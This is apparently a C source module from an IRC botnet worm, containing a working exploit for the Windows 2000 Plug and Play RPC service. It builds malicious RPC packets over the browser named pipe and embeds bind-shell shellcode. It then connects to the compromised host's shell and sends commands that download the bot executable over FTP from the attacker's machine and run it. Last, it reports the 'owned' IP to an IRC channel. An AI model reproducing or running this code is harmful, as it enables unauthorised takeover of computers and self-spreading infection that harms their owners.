#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")

BYTE Data1[0x68] =
{0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,
0x52,0x00,0x4F,0x00,0x4F,0x00,0x54,0x00,0x5C,0x00,0x53,0x00,
0x59,0x00,0x53,0x00,0x54,0x00,0x45,0x00,0x4D,0x00,0x5C,0x00,
0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x00,0x00,0x00,0x00,
0xFF,0xFF,0x00,0x00,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0xEE,0xEE,0xEE,0xEE,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x21,0x00,0x00,0x00,
0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
struct DataStruct1
{
BYTE SomeString[0x30];
DWORD RESDataType;
DWORD LFD;
DWORD SDM1;
DWORD SDO;
DWORD SDL;
DWORD SDM2;
BYTE SDA[0x07D0];
DWORD LRD;
DWORD MB;
DWORD DM;
};
struct RPCBIND
{
BYTE VerMaj;
BYTE VerMin;
BYTE PacketType;
BYTE PacketFlags;
DWORD DataRep;
WORD FragLength;
WORD AuthLength;
DWORD CallID;
WORD MaxXmitFrag;
WORD MaxRecvFrag;
DWORD AssocGroup;
BYTE NumCtxItems;
WORD ContextID;
WORD NumTransItems;
GUID InterfaceUUID;
WORD InterfaceVerMaj;
WORD InterfaceVerMin;
GUID TransferSyntax;
DWORD SyntaxVer;
};

bool ConnectShell2k(EXINFO exinfo) {


		int len;
		char recvbuf[1024];
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons(8888);

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		
		char mkdir_buff[400];

		len = frecv(sockfd, recvbuf, 1024, 0);

		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT,filename,filename);	

		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		
		Sleep(500);

		_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);

		fclosesocket(sockfd);
		return true;

}

//bindshell by DiablO port:9999
BYTE
BindShell[]={
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
"\xeb\x6f\x15\x83\xeb\xfc\xe2\xf4\xfe\x81\x84\x58\xea\x12\x90\xea"
"\xfd\x8b\xe4\x79\x26\xcf\xe4\x50\x3e\x60\x13\x10\x7a\xea\x80\x9e"
"\x4d\xf3\xe4\x4a\x22\xea\x84\x5c\x89\xdf\xe4\x14\xec\xda\xaf\x8c"
"\xae\x6f\xaf\x61\x05\x2a\xa5\x18\x03\x29\x84\xe1\x39\xbf\x4b\x3d"
"\x77\x0e\xe4\x4a\x26\xea\x84\x73\x89\xe7\x24\x9e\x5d\xf7\x6e\xfe"
"\x01\xc7\xe4\x9c\x6e\xcf\x73\x74\xc1\xda\xb4\x71\x89\xa8\x5f\x9e"
"\x42\xe7\xe4\x65\x1e\x46\xe4\x55\x0a\xb5\x07\x9b\x4c\xe5\x83\x45"
"\xfd\x3d\x09\x46\x64\x83\x5c\x27\x6a\x9c\x1c\x27\x5d\xbf\x90\xc5"
"\x6a\x20\x82\xe9\x39\xbb\x90\xc3\x5d\x62\x8a\x73\x83\x06\x67\x17"
"\x57\x81\x6d\xea\xd2\x83\xb6\x1c\xf7\x46\x38\xea\xd4\xb8\x3c\x46"
"\x51\xb8\x2c\x46\x41\xb8\x90\xc5\x64\x83\x4d\xad\x64\xb8\xe6\xf4"
"\x97\x83\xcb\x0f\x72\x2c\x38\xea\xd4\x81\x7f\x44\x57\x14\xbf\x7d"
"\xa6\x46\x41\xfc\x55\x14\xb9\x46\x57\x14\xbf\x7d\xe7\xa2\xe9\x5c"
"\x55\x14\xb9\x45\x56\xbf\x3a\xea\xd2\x78\x07\xf2\x7b\x2d\x16\x42"
"\xfd\x3d\x3a\xea\xd2\x8d\x05\x71\x64\x83\x0c\x78\x8b\x0e\x05\x45"
"\x5b\xc2\xa3\x9c\xe5\x81\x2b\x9c\xe0\xda\xaf\xe6\xa8\x15\x2d\x38"
"\xfc\xa9\x43\x86\x8f\x91\x57\xbe\xa9\x40\x07\x67\xfc\x58\x79\xea"
"\x77\xaf\x90\xc3\x59\xbc\x3d\x44\x53\xba\x05\x14\x53\xba\x3a\x44"
"\xfd\x3b\x07\xb8\xdb\xee\xa1\x46\xfd\x3d\x05\xea\xfd\xdc\x90\xc5"
"\x89\xbc\x93\x96\xc6\x8f\x90\xc3\x50\x14\xbf\x7d\xed\x25\x8f\x75"
"\x51\x14\xb9\xea\xd2\xeb\x6f\x15"};



BYTE PRPC[0x48] =
{0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xB8,0x10,0xB8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x6A,0x28,0x19,0x39,0x0C,0xB1,0xD0,0x11,0x9B,0xA8,0x00,0xC0,0x4F,0xD9,0x2E,0xF5,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

struct RPCFUNC
{
BYTE VerMaj;
BYTE VerMin;
BYTE PacketType;
BYTE PacketFlags;
DWORD DataRep;
WORD FragLength;
WORD AuthLength;
DWORD CallID;
DWORD AllocHint;
WORD ContextID;
WORD Opnum;
};
BYTE POP[0x27] ={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xAC,0x10,0x00,0x00,0x01,0x00,0x00,0x00,0x94,0x10,0x00,0x00,0x00,0x00,0x09,0x00,0x05,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x08,0x00,0x00,0x41,0x00,0x41};

int BindRpcInterface(HANDLE PH, char *Interface, char *InterfaceVer) {
BYTE rbuf[0x1000];
DWORD dw;
struct RPCBIND RPCBind;

memcpy(&RPCBind,&PRPC,sizeof(RPCBind));
UuidFromString((unsigned char *)Interface,&RPCBind.InterfaceUUID);
UuidToString(&RPCBind.InterfaceUUID,(unsigned char **)&Interface);
RPCBind.InterfaceVerMaj=atoi(&InterfaceVer[0]);
RPCBind.InterfaceVerMin=atoi(&InterfaceVer[2]);
TransactNamedPipe(PH, &RPCBind, sizeof(RPCBind), rbuf,sizeof(rbuf), &dw, NULL);
return 0;
}

int Attack(HANDLE PipeHandle)
{
struct RPCFUNC RPCOP;
int bwritten=0;
BYTE *LargeBuffer;
BYTE rbuf[0x100];
DWORD dw;
struct DataStruct1 EvilRPC;

memcpy(&EvilRPC,&Data1,sizeof(EvilRPC));
EvilRPC.SDL=0x07C0;
memset(EvilRPC.SDA,0x90,0x07D0);
EvilRPC.SDA[76]=0x3e;
EvilRPC.SDA[77]=0x1e;
EvilRPC.SDA[78]=0x02;
EvilRPC.SDA[79]=0x75;
memset(EvilRPC.SDA+80,0x90,10);
EvilRPC.SDA[90]=0x90;
memcpy(EvilRPC.SDA+94,BindShell,374);
EvilRPC.MB=0x00000004;
EvilRPC.DM=0x00000000;
EvilRPC.LFD=0x000007E0;
EvilRPC.LRD=0x000007E0;
memcpy(&RPCOP,&POP,sizeof(RPCOP));
RPCOP.Opnum = 54;
RPCOP.FragLength=sizeof(RPCOP)+sizeof(EvilRPC);
RPCOP.AllocHint=sizeof(EvilRPC);
LargeBuffer=(unsigned char *)malloc(sizeof(RPCOP)+sizeof(EvilRPC));
memset(LargeBuffer,0x00,sizeof(RPCOP)+sizeof(EvilRPC));
memcpy(LargeBuffer,&RPCOP,sizeof(RPCOP));
memcpy(LargeBuffer+sizeof(RPCOP),&EvilRPC,sizeof(EvilRPC));
TransactNamedPipe(PipeHandle, LargeBuffer,sizeof(RPCOP)+sizeof(EvilRPC), rbuf, sizeof(rbuf), &dw, NULL);
free(LargeBuffer);
return 0;
}

BOOL pnpwin2k(EXINFO exinfo)
{
    NETRESOURCE nr;
    char unc[MAX_PATH];
    char szPipe[MAX_PATH];
    HANDLE hFile;
	char buffer[ IRCLINE ];

	int TargetOS = FpHost(exinfo.ip, FP_RPC);

	if (TargetOS == OS_WINXP) return FALSE;

    _snprintf(unc, sizeof(unc), "\\\\%s\\pipe", exinfo.ip);
    unc[sizeof(unc)-1] = 0;
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpLocalName = NULL;
    nr.lpRemoteName = unc;
    nr.lpProvider = NULL;
    WNetAddConnection2(&nr, "", "", 0);

    _snprintf(szPipe, sizeof(szPipe),"\\\\%s\\pipe\\browser",exinfo.ip);
    hFile = CreateFile(szPipe, GENERIC_READ|GENERIC_WRITE, 0, NULL,OPEN_EXISTING, 0, NULL);

    BindRpcInterface(hFile,"8d9f4e40-a03d-11ce-8f69-08003e30051b","1.0");

    Attack(hFile);

    if (ConnectShell2k(exinfo) != false) {
	    _snprintf( buffer, sizeof(buffer), "[%s]: I Owned IP: %s.", exploit[ exinfo.exploit ].name, exinfo.ip );
	    irc_privmsg( exinfo.sock, exinfo.chan, buffer, exinfo.notice );
    	addlog( buffer );
    	exploit[ exinfo.exploit ].stats++;
	}

    return true;
}
